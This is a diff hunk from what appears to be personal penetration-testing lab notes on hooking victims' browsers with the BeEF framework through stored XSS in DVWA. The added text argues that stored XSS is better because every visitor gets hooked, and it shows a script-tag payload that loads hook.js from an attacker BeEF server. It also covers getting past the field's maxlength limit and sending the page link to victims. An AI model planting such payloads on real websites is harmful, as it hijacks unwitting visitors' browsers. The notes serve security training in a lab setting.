@@ -828,6 +828,9 @@ Step 7 -> now send this URL to any person and once they execute this URL they wi
  	- now go to beef control panel in browser// u will see that in online browser the person is hooked
 
  Step 8 -> Hooking victims to beef Using Stored XSS
+ Note -> beef is better to be used with stored xss bcz this way u do not need to send the URL to every one who so ever will visit the
+ webpage they will got hooked.
+ 
  - in dvwa go to XSS stored give the name as beef and message as <script src="http://10.0.2.15:3000/hook.js"></script> , if it 
  not allowing u to enter more characters then increase the no. of maxlength by doing the inspect element and then click on the button
  - it will not show any thing but now u can send this URL http://10.0.2.4/dvwa/vulnerabilities/xss_s# instead of suspisious one and
